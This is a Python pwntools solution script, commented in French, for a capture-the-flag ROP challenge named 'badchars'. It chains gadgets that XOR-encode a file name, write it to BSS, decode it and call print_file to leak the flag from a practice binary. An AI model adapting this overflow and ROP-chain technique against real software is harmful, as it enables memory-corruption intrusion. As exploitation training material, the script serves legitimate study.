from pwn import *

# But de la ROP chain :
#
# Appeler system() mais avec l'argument "cat flag.txt"
# Même problème que pour le challenge write4 mais avec des caractères interdits en plus
# Le programme les liste heureusement à l'exécution :
#    => badchars are: 'x', 'g', 'a', '.'
#
# La consigne suggère également d'utiliser du XOR
# On va donc écrire une chaîne encodée dans la section BSS puis la décoder au runtime
#
# Voir le script write4.py pour plus de détails

def xor_string(string, key):
    xor_tab =[]
    res = ""
    for i, char in enumerate(string):
        nchar = chr(ord(char) ^ key)
        res += nchar
        xor_tab.append(i)
    return bytes(res.encode('utf-8')), xor_tab

context.bits = 64

commande = "flag.txt"
xor_key = 2
resultat, offsets = xor_string(commande, xor_key)

ecriture_r13 = p64(0x400634)
# ROPgadget --binary ./badchars | grep "mov.*\["
# => 0x0000000000400634 : mov qword ptr [r13], r12 ; ret

pop_registres = p64(0x40069c)
# ROPgadget --binary ./badchars | grep "pop r13"
# 0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

pop_rdi = p64(0x4006a3)
# ROPgadget --binary ./badchars | grep "pop rdi"

section_bss = 0x601038
# gdb-peda$ maintenance info sections

operation_xor = p64(0x400628)
# ROPgadget --binary ./badchars | grep "xor"
# => 0x0000000000400628 : xor byte ptr [r15], r14b ; ret

print_file = p64(0x400510)
# (gdb) p print_file

payload = b'A' * 40 + pop_registres + resultat + p64(section_bss)
payload += p64(0xcafecafecafecafe) + p64(0xcafecafecafecafe) + ecriture_r13

for i in offsets:
    payload += pop_registres
    payload += p64(0xcafecafecafecafe) # Bullshit pour R12
    payload += p64(0xcafecafecafecafe) # Bullshit pour R13
    payload += p64(xor_key) # La clé dans R14
    payload += p64(section_bss + i) # Un caractère chiffré
    payload += operation_xor

payload += pop_rdi
payload += p64(section_bss)
payload += print_file

p = process("./badchars")

p.send(payload)
print(p.recvall().decode('utf-8'))
